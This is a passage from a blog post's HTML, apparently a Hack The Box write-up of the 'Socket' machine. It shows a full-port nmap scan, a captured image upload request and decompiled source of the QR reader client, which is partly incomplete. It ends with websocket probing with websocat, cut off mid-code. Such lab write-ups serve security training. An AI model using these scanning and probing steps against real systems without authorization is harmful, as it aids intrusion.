@@ -1,0 +1,506 @@
+<!DOCTYPE html>
+<html lang="en-us"><head>
+  <meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">Socket HTB | C3ald Cybersecurity Blog</title>
+<meta property="og:title" content="Socket HTB | C3ald Cybersecurity Blog" />
+<meta name="twitter:title" content="Socket HTB | C3ald Cybersecurity Blog" />
+<meta itemprop="name" content="Socket HTB | C3ald Cybersecurity Blog" />
+<meta name="application-name" content="Socket HTB | C3ald Cybersecurity Blog" />
+<meta property="og:site_name" content="" />
+
+<meta name="description" content="">
+<meta itemprop="description" content="" />
+<meta property="og:description" content="" />
+<meta name="twitter:description" content="" />
+
+<meta property="og:locale" content="en-us" />
+<meta name="language" content="en-us" />
+
+
+
+  <meta itemprop="image" content="http://example.org/" />
+  <meta property="og:image" content="http://example.org/" />
+  <meta name="twitter:image" content="http://example.org/" />
+  <meta name="twitter:image:src" content="http://example.org/" />
+
+
+
+
+    
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2023-03-31T23:13:39-0700 />
+    <meta property="article:published_time" content=2023-03-31T23:13:39-0700 />
+
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "Socket HTB",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2023-03-31",
+        "description": "",
+        "wordCount":  1216 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2023-03-31",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "C3ald Cybersecurity Blog"
+        }
+    }
+    </script>
+
+  <meta name="generator" content="Hugo 0.111.3">
+
+  
+
+  <link rel="canonical" href="http://example.org/posts/socket-htb/"><link href="/sass/main.min.0eebb6db90b4ec9f4444ef402f08421ee056025ba860df3d749a9f299d472008.css" rel="stylesheet"><link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+  
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon/favicon-16x16.png">
+  <link rel="manifest" href="/images/favicon/site.webmanifest">
+  <link rel="mask-icon" href="/images/favicon/safari-pinned-tab.svg" color="#5bbad5">
+  <link rel="shortcut icon" href="/images/favicon/favicon.ico">
+  <meta name="msapplication-TileColor" content="#2b5797">
+  <meta name="msapplication-config" content="/images/favicon/browserconfig.xml">
+  <meta name="theme-color" content="#ffffff">
+
+  
+  <link rel="icon" type="image/svg+xml" href="/images/favicon/favicon.svg">
+
+  
+    </head><body data-theme = "dark" class="notransition">
+<script src="http://example.org/js/themeLoader.min.4e9e1a253d543bbfec02e7f2460d9621e719fd739dc8a5256faa91cda6e12e03.js"></script><div class="navbar" role="navigation">
+  <nav class="menu" aria-label="Main Navigation">
+    <a href="/" class="logo">
+      <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+    </a>
+    <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+    <label for="menu-trigger">
+      <span class="menu-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+      </span>
+    </label>
+
+    <div class="trigger">
+      <ul class="trigger-container">
+        
+        
+        <li class="menu-separator">
+          <span>|</span>
+        </li>
+      </ul>
+      <a id="mode" href="#">
+        <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+      </a>
+    </div>
+  </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">Socket HTB</h1>
+                
+                <div class="post-meta">
+                    <time datetime="2023-03-31T23:13:39-07:00" itemprop="datePublished"> Mar 31, 2023 </time>
+                </div>
+            </header>
+            <div class="page-content">
+                <p><img src="https://www.hackthebox.com/storage/avatars/9a73cabc03399aaac0640a0148e3a371.png" alt=""></p>
+<h1 id="scan">Scan</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -sU -sS -p- --min-rate<span style="color:#f92672">=</span><span style="color:#ae81ff">10000</span> -T5 10.129.180.100
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE  
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh  
+</span></span><span style="display:flex;"><span>80/tcp   open  http  
+</span></span><span style="display:flex;"><span>5789/tcp open  unknown
+</span></span></code></pre></div><p>port <code>5789</code> is a websocket port and the website is running flask it is safe to guess that flask is also hosting the websocket server</p>
+<pre tabindex="0"><code class="language-req" data-lang="req">POST /reader HTTP/1.1
+Host: qreader.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------181768716810445582851724692176
+Content-Length: 745
+Origin: http://qreader.htb
+Connection: close
+Referer: http://qreader.htb/
+Upgrade-Insecure-Requests: 1
+
+-----------------------------181768716810445582851724692176
+Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;qrcode.png&#34;
+Content-Type: image/png
+
+PNG
+
+   
+IHDR  ô  ô    ã­â&#39;  ÓIDATxíÝAnÄ @Q»ê¹ÿ)áîB+%LhÚÏbÔÌ
+9P5¹ÒÂÇ%.Çãñx&lt;¿×Y:³ºÃøÕóÇãñø«&gt;/xeÕSUÕzéëLÇãñ½ÆöJiªÃ!sããñxü­þsØ£&#34;&#34;¶ýõ¦øx&lt;ÿû¼_Çãßë«ü¯)q¨8ðª:ú*ÈêùãñxüÙ×¿pü«âLT
+Y=&lt;?ÛâúwtÚ$hì°Ñ	ññx&lt;~ïÏÿ5^|Ú	ì~óx&lt;þÑ¾ÊÿT?¬újê5ô:¼½/?ÇnÍg©êëö~äÇR&amp;ÿÃãñO÷»üO¶4OD,~J*}Äor|&lt;_åsþ×¤~}þWïúFþÇãëwõßúÅGHÒ&gt;!ûx&lt;þÙ~|ÿK=ÄwãÈÿðxü_ñýå.õ£ÛnBpÛí0¯©ññx&lt;~¡o.wI÷_í§?87&gt;ÇßêÇ÷¿Ã¾ú&amp;dV|&lt;_åXÿÊYgKkö
+WÏÇã&#39;ø\ÒØhÞw×¡ÎÇãñ·úïê¿®®4E`ê¿x&lt;þé^ùÿx&lt;ÇãñÿÊ¸5ix	    IEND®B`
+-----------------------------181768716810445582851724692176--
+</code></pre><h1 id="code-analysis">Code analysis</h1>
+<p>upon exploring the website there is a download for the qr code reader and embed-er. Remembering that it was a python web app there should be a way to convert it back to source code. <code>https://github.com/extremecoders-re/pyinstxtractor</code> will get the source code back but it will also have all the libraries and such with it. Then using decompile++ <code>https://github.com/zrax/pycdc.git</code></p>
+<h1 id="source-code">Source code</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Source Generated with Decompyle++</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># File: qreader.pyc (Python 3.10)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> cv2
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> qrcode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> tempfile
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> random
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> PyQt5.QtWidgets <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> PyQt5 <span style="color:#f92672">import</span> uic, QtGui
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> asyncio
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> websockets
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> json
+</span></span><span style="display:flex;"><span>VERSION <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0.0.2&#39;</span>
+</span></span><span style="display:flex;"><span>ws_host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;ws://ws.qreader.htb:5789&#39;</span>
+</span></span><span style="display:flex;"><span>icon_path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./icon.png&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">setup_env</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> tmp_file_name
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># WARNING: Decompyle incomplete</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">MyGUI</span>(QMainWindow):
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>):
+</span></span><span style="display:flex;"><span>        super(MyGUI, self)<span style="color:#f92672">.</span>__init__()
+</span></span><span style="display:flex;"><span>        uic<span style="color:#f92672">.</span>loadUi(tmp_file_name, self)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>show()
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>current_file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>actionImport<span style="color:#f92672">.</span>triggered<span style="color:#f92672">.</span>connect(self<span style="color:#f92672">.</span>load_image)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>actionSave<span style="color:#f92672">.</span>triggered<span style="color:#f92672">.</span>connect(self<span style="color:#f92672">.</span>save_image)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>actionQuit<span style="color:#f92672">.</span>triggered<span style="color:#f92672">.</span>connect(self<span style="color:#f92672">.</span>quit_reader)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>actionVersion<span style="color:#f92672">.</span>triggered<span style="color:#f92672">.</span>connect(self<span style="color:#f92672">.</span>version)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>actionUpdate<span style="color:#f92672">.</span>triggered<span style="color:#f92672">.</span>connect(self<span style="color:#f92672">.</span>update)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>pushButton<span style="color:#f92672">.</span>clicked<span style="color:#f92672">.</span>connect(self<span style="color:#f92672">.</span>read_code)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>pushButton_2<span style="color:#f92672">.</span>clicked<span style="color:#f92672">.</span>connect(self<span style="color:#f92672">.</span>generate_code)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>initUI()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">initUI</span>(self):
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>setWindowIcon(QtGui<span style="color:#f92672">.</span>QIcon(icon_path))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">load_image</span>(self):
+</span></span><span style="display:flex;"><span>        options <span style="color:#f92672">=</span> QFileDialog<span style="color:#f92672">.</span>Options()
+</span></span><span style="display:flex;"><span>        (filename, _) <span style="color:#f92672">=</span> QFileDialog<span style="color:#f92672">.</span>getOpenFileName(self, <span style="color:#e6db74">&#39;Open File&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;All Files (*)&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> filename <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;&#39;</span>:
+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>current_file <span style="color:#f92672">=</span> filename
+</span></span><span style="display:flex;"><span>            pixmap <span style="color:#f92672">=</span> QtGui<span style="color:#f92672">.</span>QPixmap(self<span style="color:#f92672">.</span>current_file)
+</span></span><span style="display:flex;"><span>            pixmap <span style="color:#f92672">=</span> pixmap<span style="color:#f92672">.</span>scaled(<span style="color:#ae81ff">300</span>, <span style="color:#ae81ff">300</span>)
+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>label<span style="color:#f92672">.</span>setScaledContents(<span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>label<span style="color:#f92672">.</span>setPixmap(pixmap)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">save_image</span>(self):
+</span></span><span style="display:flex;"><span>        options <span style="color:#f92672">=</span> QFileDialog<span style="color:#f92672">.</span>Options()
+</span></span><span style="display:flex;"><span>        (filename, _) <span style="color:#f92672">=</span> QFileDialog<span style="color:#f92672">.</span>getSaveFileName(self, <span style="color:#e6db74">&#39;Save File&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;PNG (*.png)&#39;</span>, options, <span style="color:#f92672">**</span>(<span style="color:#e6db74">&#39;options&#39;</span>,))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> filename <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;&#39;</span>:
+</span></span><span style="display:flex;"><span>            img <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>label<span style="color:#f92672">.</span>pixmap()
+</span></span><span style="display:flex;"><span>            img<span style="color:#f92672">.</span>save(filename, <span style="color:#e6db74">&#39;PNG&#39;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">read_code</span>(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>current_file <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;&#39;</span>:
+</span></span><span style="display:flex;"><span>            img <span style="color:#f92672">=</span> cv2<span style="color:#f92672">.</span>imread(self<span style="color:#f92672">.</span>current_file)
+</span></span><span style="display:flex;"><span>            detector <span style="color:#f92672">=</span> cv2<span style="color:#f92672">.</span>QRCodeDetector()
+</span></span><span style="display:flex;"><span>            (data, bbox, straight_qrcode) <span style="color:#f92672">=</span> detector<span style="color:#f92672">.</span>detectAndDecode(img)
+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>textEdit<span style="color:#f92672">.</span>setText(data)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">None</span><span style="color:#f92672">.</span>statusBar()<span style="color:#f92672">.</span>showMessage(<span style="color:#e6db74">&#39;[ERROR] No image is imported!&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">generate_code</span>(self):
+</span></span><span style="display:flex;"><span>        qr <span style="color:#f92672">=</span> qrcode<span style="color:#f92672">.</span>QRCode(<span style="color:#ae81ff">1</span>, qrcode<span style="color:#f92672">.</span>constants<span style="color:#f92672">.</span>ERROR_CORRECT_L, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">2</span>, <span style="color:#f92672">**</span>(<span style="color:#e6db74">&#39;version&#39;</span>, <span style="color:#e6db74">&#39;error_correction&#39;</span>, <span style="color:#e6db74">&#39;box_size&#39;</span>, <span style="color:#e6db74">&#39;border&#39;</span>))
+</span></span><span style="display:flex;"><span>        qr<span style="color:#f92672">.</span>add_data(self<span style="color:#f92672">.</span>textEdit<span style="color:#f92672">.</span>toPlainText())
+</span></span><span style="display:flex;"><span>        qr<span style="color:#f92672">.</span>make(<span style="color:#66d9ef">True</span>, <span style="color:#f92672">**</span>(<span style="color:#e6db74">&#39;fit&#39;</span>,))
+</span></span><span style="display:flex;"><span>        img <span style="color:#f92672">=</span> qr<span style="color:#f92672">.</span>make_image(<span style="color:#e6db74">&#39;black&#39;</span>, <span style="color:#e6db74">&#39;white&#39;</span>, <span style="color:#f92672">**</span>(<span style="color:#e6db74">&#39;fill_color&#39;</span>, <span style="color:#e6db74">&#39;back_color&#39;</span>))
+</span></span><span style="display:flex;"><span>        img<span style="color:#f92672">.</span>save(<span style="color:#e6db74">&#39;current.png&#39;</span>)
+</span></span><span style="display:flex;"><span>        pixmap <span style="color:#f92672">=</span> QtGui<span style="color:#f92672">.</span>QPixmap(<span style="color:#e6db74">&#39;current.png&#39;</span>)
+</span></span><span style="display:flex;"><span>        pixmap <span style="color:#f92672">=</span> pixmap<span style="color:#f92672">.</span>scaled(<span style="color:#ae81ff">300</span>, <span style="color:#ae81ff">300</span>)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>label<span style="color:#f92672">.</span>setScaledContents(<span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>label<span style="color:#f92672">.</span>setPixmap(pixmap)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">quit_reader</span>(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(tmp_file_name):
+</span></span><span style="display:flex;"><span>            os<span style="color:#f92672">.</span>remove(tmp_file_name)
+</span></span><span style="display:flex;"><span>        sys<span style="color:#f92672">.</span>exit()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">version</span>(self):
+</span></span><span style="display:flex;"><span>        response <span style="color:#f92672">=</span> asyncio<span style="color:#f92672">.</span>run(ws_connect(ws_host <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/version&#39;</span>, json<span style="color:#f92672">.</span>dumps({
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;version&#39;</span>: VERSION })))
+</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(response)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;error&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> data<span style="color:#f92672">.</span>keys():
+</span></span><span style="display:flex;"><span>            version_info <span style="color:#f92672">=</span> data[<span style="color:#e6db74">&#39;message&#39;</span>]
+</span></span><span style="display:flex;"><span>            msg <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;[INFO] You have version </span><span style="color:#e6db74">{</span>version_info[<span style="color:#e6db74">&#39;version&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74"> which was released on </span><span style="color:#e6db74">{</span>version_info[<span style="color:#e6db74">&#39;released_date&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>statusBar()<span style="color:#f92672">.</span>showMessage(msg)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>        error <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>[<span style="color:#e6db74">&#39;error&#39;</span>]
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>statusBar()<span style="color:#f92672">.</span>showMessage(error)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">update</span>(self):
+</span></span><span style="display:flex;"><span>        response <span style="color:#f92672">=</span> asyncio<span style="color:#f92672">.</span>run(ws_connect(ws_host <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/update&#39;</span>, json<span style="color:#f92672">.</span>dumps({
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;version&#39;</span>: VERSION })))
+</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(response)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;error&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> data<span style="color:#f92672">.</span>keys():
+</span></span><span style="display:flex;"><span>            msg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;[INFO] &#39;</span> <span style="color:#f92672">+</span> data[<span style="color:#e6db74">&#39;message&#39;</span>]
+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>statusBar()<span style="color:#f92672">.</span>showMessage(msg)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>        error <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>[<span style="color:#e6db74">&#39;error&#39;</span>]
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>statusBar()<span style="color:#f92672">.</span>showMessage(error)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    __classcell__ <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">ws_connect</span>(url, msg):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># WARNING: Decompyle incomplete</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    (status, e) <span style="color:#f92672">=</span> setup_env()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> status:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[-] Problem occured while setting up the env!&#39;</span>)
+</span></span><span style="display:flex;"><span>    app <span style="color:#f92672">=</span> QApplication([])
+</span></span><span style="display:flex;"><span>    window <span style="color:#f92672">=</span> MyGUI()
+</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>exec_()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
+</span></span></code></pre></div><p>In theory there should be a few ways to do this, hide a payload inside the qr code with exiftool, find some kind of server side injection vulnerability, or some kind of input invalidation in the websocket route.</p>
+<h1 id="socks">Socks</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>websocat -S ws://10.129.200.210:5789/vesion
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;version&#34;</span>:<span style="color:#e6db74">&#34;0.0.2&#34;</span><span style="color:#f92672">}</span>  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;paths&#34;</span>: <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;/update&#34;</span>: <span style="color:#e6db74">&#34;Check for updates&#34;</span>, <span style="color:#e6db74">&#34;/version&#34;</span>: <span style="color:#e6db74">&#34;Get version information&#34;</span><span style="color:#f92672">}}</span>
+</span></span></code></pre></div><p>it looks like there might be some kind of input invalidation vulnerability.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">version</span>(self):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>response <span style="color:#f92672">=</span> asyncio<span style="color:#f92672">.</span>run(ws_connect(ws_host <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/version&#39;</span>, json<span style="color:#f92672">.</span>dumps({
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;version&#39;</span>: VERSION })))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(response)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;error&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> data<span style="color:#f92672">.</span>keys():
+</span></span><span style="display:flex;"><span>
